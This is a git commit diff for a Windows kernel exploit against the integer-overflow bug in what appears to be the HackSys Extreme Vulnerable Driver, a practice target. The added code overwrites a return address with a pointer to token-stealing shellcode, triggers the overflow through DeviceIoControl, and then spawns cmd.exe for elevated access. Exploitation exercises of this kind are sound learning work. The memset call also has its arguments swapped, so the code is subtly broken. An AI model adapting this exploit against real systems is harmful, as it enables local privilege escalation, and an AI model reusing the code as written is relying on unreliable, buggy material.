ff304596f143117c3918f8a0068d3ca45ffd4be2
yuval <yuvalyohanan3@gmail.com>
2020-08-13 16:55:01 +0300

    finished exploit

--- HEVD_Solutions/IntegerOverflow.cpp
+++ HEVD_Solutions/IntegerOverflow.cpp
@@ -2,34 +2,39 @@
 #include "Solutions.h"
 #include "ioctal_codes.h"
 #include "stdio.h"
+#include "random_str.h"
+#include "TokenStealingShellcode.h"
 
 DWORD Solutions::TriggerIntegerOverflow() {
-	DWORD dwBufSize = 0x900;
-	LONG lTerminatorValue = 0xBAD0B0B0;
-	PUINT lpInBuffer = NULL;
+	DWORD dwBufSize = 0x828;
+	DWORD lTerminatorValue = 0xBAD0B0B0;
+	PUCHAR lpInBuffer = NULL;
 	DWORD dwIoctl = IOCTL_INTEGER_OVERFLOW;
 	DWORD dwBytesReturned = NULL;
+	PVOID pEopPayload = &tokenStealingShellcode;
 
-	lpInBuffer = (PUINT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize * sizeof(INT) + sizeof(INT));
+	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize + sizeof(PULONG) * 2);
 	if (!lpInBuffer) {
-		wprintf(L"[-] Could not allocate buffer :(");
+		wprintf(L"[-] Could not allocate buffer :(\n");
 		return 1;
 	}
 
-	for (int i = 0; i < dwBufSize; i++) {
-		lpInBuffer[i] = 0x41414141;
-	}
-	lpInBuffer[dwBufSize] = lTerminatorValue;
-	wprintf(L"[+] Initialized buffer with 0x41");
+	memset(lpInBuffer, dwBufSize, 0x41);
+	*(PULONG)(lpInBuffer + dwBufSize) = (ULONG)pEopPayload;
+	*(PULONG)(lpInBuffer + dwBufSize + 4) = lTerminatorValue;
+
+	wprintf(L"[+] Prepering to jump to shellcode - 0x%x\n", (ULONG)pEopPayload);
 
 	if (!DeviceIoControl(_hDeviceHandle, dwIoctl, (LPVOID)lpInBuffer, 0xffffffff,
 		NULL, NULL, &dwBytesReturned, NULL)) {
-		wprintf(L"[-] Could not talk with the driver :(");
+		wprintf(L"[-] Could not talk with the driver :(\n");
 		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
 		return 1;
 	}
 
-	wprintf(L"[+] Succesfully talked with the driver");
+	wprintf(L"[+] Succesfully talked with the driver\n");
+
+	system("cmd.exe");
 
 	return 0;
 }
